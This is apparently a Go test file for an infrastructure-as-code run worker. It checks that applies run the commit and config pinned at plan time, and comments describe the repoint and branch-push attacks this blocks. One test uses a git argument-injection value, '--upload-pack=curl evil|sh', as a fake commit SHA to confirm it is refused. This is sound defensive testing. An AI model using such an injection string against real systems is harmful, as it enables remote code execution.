package worker

import (
	"context"
	"testing"

	"github.com/riverqueue/river"

	"github.com/nanohype/portal/internal/logstream"
	"github.com/nanohype/portal/internal/repository"
	"github.com/nanohype/portal/internal/worker/executor"
)

// recordingExecutor captures the parameters the worker builds and reports a
// clean result, so a test can assert on what would have been checked out and run
// without running anything.
type recordingExecutor struct {
	params executor.ExecuteParams
	called bool

	// resolvedCommit is what a real executor reports back after a checkout: the
	// commit the run actually ran. Empty means the executor resolved nothing,
	// which is what an upload-source run looks like.
	resolvedCommit string
}

func (e *recordingExecutor) Execute(_ context.Context, params executor.ExecuteParams) (*executor.ExecuteResult, error) {
	e.params = params
	e.called = true
	params.LogCallback([]byte("recorded\n"))
	return &executor.ExecuteResult{Output: "recorded", CommitSHA: e.resolvedCommit}, nil
}

func newTestRunWorker(exec executor.Executor) *RunJobWorker {
	return NewRunJobWorker(testQueries, exec, logstream.NewMemoryStreamer(), nil, nil)
}

// The apply that follows an approval is a fresh execution — a new checkout, a
// new process, no saved plan file replayed. What it executes therefore has to be
// decided when the run is created, not when the job starts, or the signature
// covers a plan the worker never runs.
//
// Both levers that would move it sit at the operator bar the workspace routes
// use: PUT /workspaces/{id} (repo, branch, working dir) and
// POST /workspaces/{id}/upload (a new config archive). The exploit is: park a
// plan on a gated workspace, repoint the workspace, let an admin approve the
// diff they were shown, and the apply runs the attacker's tree.
func TestRunJobExecutesThePinnedConfigNotTheLiveWorkspace(t *testing.T) {
	requireDB(t)
	ctx := context.Background()
	orgID, userID := seedOrg(t, ctx, "pin")

	wsID := id()
	exec(t, ctx,
		`INSERT INTO workspaces (id,org_id,name,created_by,source,repo_url,repo_branch,working_dir,tofu_version,requires_approval)
		 VALUES ($1,$2,$3,$4,'vcs','https://example.test/infra.git','main','envs/production','1.11.0',TRUE)`,
		wsID, orgID, "ws-"+wsID, userID)

	run, err := testQueries.CreateRun(ctx, repository.CreateRunParams{
		ID: id(), WorkspaceID: wsID, OrgID: orgID, Operation: "plan", Status: "pending", CreatedBy: userID,
		ConfigSource:      "vcs",
		ConfigRepoURL:     "https://example.test/infra.git",
		ConfigRepoBranch:  "main",
		ConfigWorkingDir:  "envs/production",
		ConfigTofuVersion: "1.11.0",
	})
	if err != nil {
		t.Fatalf("create run: %v", err)
	}

	// The window: an operator repoints the workspace while the plan waits for a
	// signature. Every field the executor would clone from moves.
	exec(t, ctx,
		`UPDATE workspaces SET repo_url='https://example.test/attacker.git', repo_branch='attacker',
		 working_dir='.', tofu_version='1.6.0' WHERE id=$1`, wsID)

	rec := &recordingExecutor{}
	w := newTestRunWorker(rec)
	if err := w.Work(ctx, &river.Job[RunJobArgs]{
		Args: RunJobArgs{RunID: run.ID, WorkspaceID: wsID, OrgID: orgID, Operation: "apply"},
	}); err != nil {
		t.Fatalf("work: %v", err)
	}
	if !rec.called {
		t.Fatal("executor was never invoked")
	}

	if rec.params.RepoURL != "https://example.test/infra.git" {
		t.Errorf("RepoURL = %q, want the repo the run was created against", rec.params.RepoURL)
	}
	if rec.params.RepoBranch != "main" {
		t.Errorf("RepoBranch = %q, want main — the branch the plan was produced from", rec.params.RepoBranch)
	}
	if rec.params.WorkingDir != "envs/production" {
		t.Errorf("WorkingDir = %q, want envs/production", rec.params.WorkingDir)
	}
	if rec.params.TofuVersion != "1.11.0" {
		t.Errorf("TofuVersion = %q, want 1.11.0", rec.params.TofuVersion)
	}
	if rec.params.Source != "vcs" {
		t.Errorf("Source = %q, want vcs", rec.params.Source)
	}
}

// The upload variant of the same exploit: swap the archive instead of the branch.
// An upload workspace stores only its current config version, so an apply that
// read the workspace would run whatever was uploaded last — including something
// uploaded after the plan an admin signed.
func TestRunJobExecutesThePinnedConfigVersionForUploads(t *testing.T) {
	requireDB(t)
	ctx := context.Background()
	orgID, userID := seedOrg(t, ctx, "pin-upload")

	wsID := id()
	exec(t, ctx,
		`INSERT INTO workspaces (id,org_id,name,created_by,source,current_config_version_id,requires_approval)
		 VALUES ($1,$2,$3,$4,'upload','cfg-signed',TRUE)`,
		wsID, orgID, "ws-"+wsID, userID)

	run, err := testQueries.CreateRun(ctx, repository.CreateRunParams{
		ID: id(), WorkspaceID: wsID, OrgID: orgID, Operation: "plan", Status: "pending", CreatedBy: userID,
		ConfigSource:    "upload",
		ConfigVersionID: "cfg-signed",
	})
	if err != nil {
		t.Fatalf("create run: %v", err)
	}
	exec(t, ctx, `UPDATE workspaces SET current_config_version_id='cfg-attacker' WHERE id=$1`, wsID)

	rec := &recordingExecutor{}
	w := newTestRunWorker(rec)
	if err := w.Work(ctx, &river.Job[RunJobArgs]{
		Args: RunJobArgs{RunID: run.ID, WorkspaceID: wsID, OrgID: orgID, Operation: "apply"},
	}); err != nil {
		t.Fatalf("work: %v", err)
	}

	if rec.params.Source != "upload" {
		t.Errorf("Source = %q, want upload", rec.params.Source)
	}
	// Storage is nil here, so no archive is fetched; the run row is what decides
	// which one would have been. Assert on the row the worker read.
	after, err := testQueries.GetRun(ctx, repository.GetRunParams{ID: run.ID, OrgID: orgID})
	if err != nil {
		t.Fatalf("get run: %v", err)
	}
	if after.ConfigVersionID != "cfg-signed" {
		t.Errorf("run config version = %q, want cfg-signed", after.ConfigVersionID)
	}
}

// The gate decision after a plan is a question about the workspace as it stands
// now — is this workspace one where applies wait for a human — so that one still
// reads the live row. Only the tree to execute is frozen.
func TestRunJobReadsTheGateFromTheLiveWorkspace(t *testing.T) {
	requireDB(t)
	ctx := context.Background()
	orgID, userID := seedOrg(t, ctx, "pin-gate")

	wsID := id()
	exec(t, ctx,
		`INSERT INTO workspaces (id,org_id,name,created_by,source,repo_url,repo_branch,working_dir,requires_approval)
		 VALUES ($1,$2,$3,$4,'vcs','https://example.test/infra.git','main','.',FALSE)`,
		wsID, orgID, "ws-"+wsID, userID)

	run, err := testQueries.CreateRun(ctx, repository.CreateRunParams{
		ID: id(), WorkspaceID: wsID, OrgID: orgID, Operation: "plan", Status: "pending", CreatedBy: userID,
		ConfigSource: "vcs", ConfigRepoURL: "https://example.test/infra.git",
		ConfigRepoBranch: "main", ConfigWorkingDir: ".",
	})
	if err != nil {
		t.Fatalf("create run: %v", err)
	}
	// An admin gates the workspace after the plan was started.
	exec(t, ctx, `UPDATE workspaces SET requires_approval=TRUE WHERE id=$1`, wsID)

	w := newTestRunWorker(&recordingExecutor{})
	if err := w.Work(ctx, &river.Job[RunJobArgs]{
		Args: RunJobArgs{RunID: run.ID, WorkspaceID: wsID, OrgID: orgID, Operation: "plan"},
	}); err != nil {
		t.Fatalf("work: %v", err)
	}

	after, err := testQueries.GetRun(ctx, repository.GetRunParams{ID: run.ID, OrgID: orgID})
	if err != nil {
		t.Fatalf("get run: %v", err)
	}
	if after.Status != "awaiting_approval" {
		t.Errorf("run status = %q, want awaiting_approval — the gate is read live", after.Status)
	}
}

// A run row with no pinned configuration cannot be executed: the only fallback
// available is the live workspace, which is what the pin exists to stop the
// worker reading. It fails the run instead of guessing.
func TestRunJobRefusesAnUnpinnedRun(t *testing.T) {
	requireDB(t)
	ctx := context.Background()
	orgID, userID := seedOrg(t, ctx, "pin-missing")

	wsID := id()
	exec(t, ctx,
		`INSERT INTO workspaces (id,org_id,name,created_by,source,repo_url,repo_branch)
		 VALUES ($1,$2,$3,$4,'vcs','https://example.test/infra.git','main')`,
		wsID, orgID, "ws-"+wsID, userID)

	runID := id()
	exec(t, ctx,
		`INSERT INTO runs (id,workspace_id,org_id,operation,status,created_by) VALUES ($1,$2,$3,'apply','pending',$4)`,
		runID, wsID, orgID, userID)

	rec := &recordingExecutor{}
	w := newTestRunWorker(rec)
	if err := w.Work(ctx, &river.Job[RunJobArgs]{
		Args: RunJobArgs{RunID: runID, WorkspaceID: wsID, OrgID: orgID, Operation: "apply"},
	}); err != nil {
		t.Fatalf("work: %v", err)
	}
	if rec.called {
		t.Fatal("an unpinned run must not execute")
	}
	var status, message string
	if err := testPool.QueryRow(ctx, `SELECT status, error_message FROM runs WHERE id=$1`, runID).Scan(&status, &message); err != nil {
		t.Fatalf("read run: %v", err)
	}
	if status != "errored" {
		t.Errorf("run status = %q, want errored", status)
	}
	if message == "" {
		t.Error("an unpinned run must say why it failed")
	}
}

// A branch is not a pin. Freezing repo + branch + working dir on the run row
// stops the workspace being repointed under a parked plan, but it does not stop
// the branch itself from moving: the plan clones branch head, parks at
// awaiting_approval, and the apply that follows the signature clones branch head
// again. Anyone with write access to that branch can push between the two, and
// the admin's signature lands on a tree they never saw.
//
// What closes it is recording the commit the plan actually executed and running
// that commit on the way back through. Both halves are asserted here: the plan
// pins the run, and the apply of the same run is handed that commit.
func TestRunJobPinsTheCommitThePlanExecutedAndAppliesIt(t *testing.T) {
	requireDB(t)
	ctx := context.Background()
	orgID, userID := seedOrg(t, ctx, "pin-commit")

	const planned = "9f1c0d3a5b7e2f4681c9a0d3e5f7b921c4d6e8fa"

	wsID := id()
	exec(t, ctx,
		`INSERT INTO workspaces (id,org_id,name,created_by,source,repo_url,repo_branch,working_dir,requires_approval)
		 VALUES ($1,$2,$3,$4,'vcs','https://example.test/infra.git','main','envs/production',TRUE)`,
		wsID, orgID, "ws-"+wsID, userID)

	run, err := testQueries.CreateRun(ctx, repository.CreateRunParams{
		ID: id(), WorkspaceID: wsID, OrgID: orgID, Operation: "plan", Status: "pending", CreatedBy: userID,
		ConfigSource: "vcs", ConfigRepoURL: "https://example.test/infra.git",
		ConfigRepoBranch: "main", ConfigWorkingDir: "envs/production", ConfigTofuVersion: "1.11.0",
	})
	if err != nil {
		t.Fatalf("create run: %v", err)
	}

	// The plan. Nothing is pinned yet, so it runs branch head and reports back
	// which commit that turned out to be.
	planExec := &recordingExecutor{resolvedCommit: planned}
	if err := newTestRunWorker(planExec).Work(ctx, &river.Job[RunJobArgs]{
		Args: RunJobArgs{RunID: run.ID, WorkspaceID: wsID, OrgID: orgID, Operation: "plan"},
	}); err != nil {
		t.Fatalf("plan work: %v", err)
	}
	if planExec.params.CommitSHA != "" {
		t.Errorf("first plan was handed CommitSHA %q, want branch head", planExec.params.CommitSHA)
	}

	afterPlan, err := testQueries.GetRun(ctx, repository.GetRunParams{ID: run.ID, OrgID: orgID})
	if err != nil {
		t.Fatalf("get run: %v", err)
	}
	if afterPlan.Status != "awaiting_approval" {
		t.Fatalf("run status = %q, want awaiting_approval", afterPlan.Status)
	}
	if afterPlan.CommitSHA != planned {
		t.Fatalf("run commit_sha = %q, want the commit the plan executed (%s)", afterPlan.CommitSHA, planned)
	}

	// The window: someone pushes to the branch while the plan waits for a
	// signature. The apply of this same run must not follow the branch.
	applyExec := &recordingExecutor{resolvedCommit: "0000000000000000000000000000000000000000"}
	if err := newTestRunWorker(applyExec).Work(ctx, &river.Job[RunJobArgs]{
		Args: RunJobArgs{RunID: run.ID, WorkspaceID: wsID, OrgID: orgID, Operation: "apply"},
	}); err != nil {
		t.Fatalf("apply work: %v", err)
	}
	if applyExec.params.CommitSHA != planned {
		t.Errorf("apply was handed CommitSHA %q, want the planned commit %s", applyExec.params.CommitSHA, planned)
	}
	if applyExec.params.RepoBranch != "main" {
		t.Errorf("RepoBranch = %q, want main", applyExec.params.RepoBranch)
	}

	// And the pin is written once: what the apply's checkout resolved does not
	// overwrite the commit the signature was given for.
	afterApply, err := testQueries.GetRun(ctx, repository.GetRunParams{ID: run.ID, OrgID: orgID})
	if err != nil {
		t.Fatalf("get run: %v", err)
	}
	if afterApply.CommitSHA != planned {
		t.Errorf("run commit_sha after apply = %q, want it still %s", afterApply.CommitSHA, planned)
	}
}

// A VCS-triggered run arrives already pinned — the webhook knows the commit that
// was pushed. That pin is the one to run, so the executor gets it on the first
// pass and nothing rewrites it afterwards.
func TestRunJobHonoursAPinTheVCSTriggerSet(t *testing.T) {
	requireDB(t)
	ctx := context.Background()
	orgID, userID := seedOrg(t, ctx, "pin-webhook")

	const pushed = "1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d"

	wsID := id()
	exec(t, ctx,
		`INSERT INTO workspaces (id,org_id,name,created_by,source,repo_url,repo_branch,working_dir)
		 VALUES ($1,$2,$3,$4,'vcs','https://example.test/infra.git','main','.')`,
		wsID, orgID, "ws-"+wsID, userID)

	run, err := testQueries.CreateRun(ctx, repository.CreateRunParams{
		ID: id(), WorkspaceID: wsID, OrgID: orgID, Operation: "plan", Status: "pending", CreatedBy: userID,
		CommitSHA:    pushed,
		ConfigSource: "vcs", ConfigRepoURL: "https://example.test/infra.git",
		ConfigRepoBranch: "main", ConfigWorkingDir: ".",
	})
	if err != nil {
		t.Fatalf("create run: %v", err)
	}

	rec := &recordingExecutor{resolvedCommit: pushed}
	if err := newTestRunWorker(rec).Work(ctx, &river.Job[RunJobArgs]{
		Args: RunJobArgs{RunID: run.ID, WorkspaceID: wsID, OrgID: orgID, Operation: "plan"},
	}); err != nil {
		t.Fatalf("work: %v", err)
	}
	if rec.params.CommitSHA != pushed {
		t.Errorf("executor CommitSHA = %q, want the pushed commit %s", rec.params.CommitSHA, pushed)
	}

	after, err := testQueries.GetRun(ctx, repository.GetRunParams{ID: run.ID, OrgID: orgID})
	if err != nil {
		t.Fatalf("get run: %v", err)
	}
	if after.CommitSHA != pushed {
		t.Errorf("run commit_sha = %q, want %s", after.CommitSHA, pushed)
	}
}

// An upload-source run has no commit to pin to — its tree is the config version
// on the run row — so nothing is passed to the executor and nothing is recorded.
func TestRunJobDoesNotPinAnUploadRun(t *testing.T) {
	requireDB(t)
	ctx := context.Background()
	orgID, userID := seedOrg(t, ctx, "pin-nocommit")

	wsID := id()
	exec(t, ctx,
		`INSERT INTO workspaces (id,org_id,name,created_by,source,current_config_version_id)
		 VALUES ($1,$2,$3,$4,'upload','cfg-1')`,
		wsID, orgID, "ws-"+wsID, userID)

	run, err := testQueries.CreateRun(ctx, repository.CreateRunParams{
		ID: id(), WorkspaceID: wsID, OrgID: orgID, Operation: "plan", Status: "pending", CreatedBy: userID,
		ConfigSource: "upload", ConfigVersionID: "cfg-1",
	})
	if err != nil {
		t.Fatalf("create run: %v", err)
	}

	rec := &recordingExecutor{}
	if err := newTestRunWorker(rec).Work(ctx, &river.Job[RunJobArgs]{
		Args: RunJobArgs{RunID: run.ID, WorkspaceID: wsID, OrgID: orgID, Operation: "plan"},
	}); err != nil {
		t.Fatalf("work: %v", err)
	}
	if rec.params.CommitSHA != "" {
		t.Errorf("upload run was handed CommitSHA %q, want none", rec.params.CommitSHA)
	}

	after, err := testQueries.GetRun(ctx, repository.GetRunParams{ID: run.ID, OrgID: orgID})
	if err != nil {
		t.Fatalf("get run: %v", err)
	}
	if after.CommitSHA != "" {
		t.Errorf("run commit_sha = %q, want empty", after.CommitSHA)
	}
}

// A pin portal cannot resolve stops the run. Ignoring it would apply branch
// head, which is exactly the tree the pin exists to refuse.
func TestRunJobRefusesAPinThatIsNotACommitID(t *testing.T) {
	requireDB(t)
	ctx := context.Background()
	orgID, userID := seedOrg(t, ctx, "pin-garbage")

	wsID := id()
	exec(t, ctx,
		`INSERT INTO workspaces (id,org_id,name,created_by,source,repo_url,repo_branch,working_dir)
		 VALUES ($1,$2,$3,$4,'vcs','https://example.test/infra.git','main','.')`,
		wsID, orgID, "ws-"+wsID, userID)

	run, err := testQueries.CreateRun(ctx, repository.CreateRunParams{
		ID: id(), WorkspaceID: wsID, OrgID: orgID, Operation: "apply", Status: "pending", CreatedBy: userID,
		CommitSHA:    "--upload-pack=curl evil|sh",
		ConfigSource: "vcs", ConfigRepoURL: "https://example.test/infra.git",
		ConfigRepoBranch: "main", ConfigWorkingDir: ".",
	})
	if err != nil {
		t.Fatalf("create run: %v", err)
	}

	rec := &recordingExecutor{}
	if err := newTestRunWorker(rec).Work(ctx, &river.Job[RunJobArgs]{
		Args: RunJobArgs{RunID: run.ID, WorkspaceID: wsID, OrgID: orgID, Operation: "apply"},
	}); err != nil {
		t.Fatalf("work: %v", err)
	}
	if rec.called {
		t.Fatal("a run pinned to something that is not a commit id must not execute")
	}

	var status, message string
	if err := testPool.QueryRow(ctx, `SELECT status, error_message FROM runs WHERE id=$1`, run.ID).Scan(&status, &message); err != nil {
		t.Fatalf("read run: %v", err)
	}
	if status != "errored" {
		t.Errorf("run status = %q, want errored", status)
	}
	if message == "" {
		t.Error("the run must say why it failed")
	}
}
